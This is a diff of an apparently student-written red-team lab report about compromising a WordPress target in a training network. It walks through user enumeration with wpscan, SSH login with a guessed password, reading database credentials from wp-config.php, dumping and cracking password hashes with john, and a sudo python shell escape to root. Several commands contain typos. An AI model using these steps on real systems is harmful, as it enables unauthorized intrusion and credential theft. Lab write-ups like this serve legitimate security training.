@@ -11,36 +11,76 @@ Nmap scan results for each machine reveal the below services and OS details:
 
 `nmap 192.168.1.0/24`
 
+![full nmap 1]()
+![full nmap 2]()
 
-Target 1
+## Target 1
 
 `nmap 192.168.1.110`
 
+
+
 This scan identifies the services below as potential points of entry:
 - Target 1
-  - List of
   - Exposed Services
-
-_TODO: Fill out the list below. Include severity, and CVE numbers, if possible._
+  * Open Port 22/TCP - SSH
+  * Open Port 80/TCP - HTTP
+  * Open Port 111/TCP - rpcbind
+  * Open Port 139/TCP - netbios-ssn
+  * Open Port 445/TCP - microsoft-ds
 
 The following vulnerabilities were identified on each target:
 - Target 1
-  - List of
-  - Critical
-  - Vulnerabilities
-
+  - User Enumeration (WordPress Site)
+  - Weak User Password
+  - Unsalted User Password Hash (WordPress Database)
+  - Misconfiguration of User Privileges/Privilege Escalation
+![nmap target 1]()
 _TODO: Include vulnerability scan results to prove the identified vulnerabilities._
 
 ### Exploitation
-_TODO: Fill out the details below. Include screenshots where possible._
-
 The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
 - Target 1
-  - `flag1.txt`: _TODO: Insert `flag1.txt` hash value_
+  - `flag1.txt`: `b9bbcb33ellb80be759c4e844862482d`
     - **Exploit Used**
-      - _TODO: Identify the exploit used_
-      - _TODO: Include the command run_
-  - `flag2.txt`: _TODO: Insert `flag2.txt` hash value_
+      - WPscan was used from the attack machine to enumerate the users on the Target1 wordpress site
+      - The Command use
+        - `wpscan --url 192.168.1.110/wordpress/ -e u`
+      - SSH'd into `192.168.1.110` using the user `Michael` guessed the weak password `Michael`
+      - Navigated to /var/wwww/html/
+      - Ran `nano services.html` and in the footer information found Flag1
+![Flag1](https://github.com/shansen18/BootCamp/blob/main/Final_Project/Images/Flag1.PNG)
+
+  - `flag2.txt`:`flag2{fc3fd58dcdad9ab23faca6e9a3e581c}`
     - **Exploit Used**
-      - _TODO: Identify the exploit used_
-      - _TODO: Include the command run_
+      - Flag2 was located while exploring `Target1` to find other potential useful files.
+      - `cd ..`
+      - `ls`
+      - `nano flag2.txt`
+![flag2](https://github.com/shansen18/BootCamp/blob/main/Final_Project/Images/Flag2.PNG)
+
+ - `flag3.txt`:`flag3{afc01ab56b50591e7dccf93122770cd2}`
+    - **Exploit Used**
+      - During infiltration `wp-config.php` was found at `/var/www.html/wordpress`
+      - `nano wp-config.php` and found the admin user is `root` and the password is `R@v3nSecurity`
+      - `Crtl X` to exit nano.
+      - `myspql --user=root --password=R@v3nSecurity -h 127.0.0.1` to enter the database
+      - `showdatabases;` to view databases
+      - `use wordpress;` to use the wordpress database
+      - `select * from wp_posts;` to find flag3 and flag4 in wp_posts.
+      - `select * from wp_users;` to find users and password hashes.
+![dbusername](https://github.com/shansen18/BootCamp/blob/main/Final_Project/Images/databasepswrd.PNG)
+![Flag3](https://github.com/shansen18/BootCamp/blob/main/Final_Project/Images/databasepswrd.PNG)
+
+ - `flag4.txt`:`flag4{715dea6c055b9fe3337544932f2941ce}`
+    - **Exploit Used**
+      - Simple password and unsalted hash
+        - Created a hash.txt that contained user `steven` hash `$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/` on attacking machine
+        - Copied `Rockyou.txt` from `/usr/share/wordlists/rockyou.txt wp_hashes.txt` incase it is needed for another hash crack. 
+        - Ran `john hash.txt --wordlist=rockyou.txt` and found that the password is `pink84`
+        - Ran `-ssh steven@192.168.1.110` using pink84 as the password. 
+        - Ran `sudo python -c "import pty;pty.spawn('/bin/bash')"` this gave Root privileges
+        - `CD /root`
+        - `ls` saw flag4.txt
+        - `cat flag4.txt` to find the flag. 
+        ![flag4](https://github.com/shansen18/BootCamp/blob/main/Final_Project/Images/Flag4.PNG)
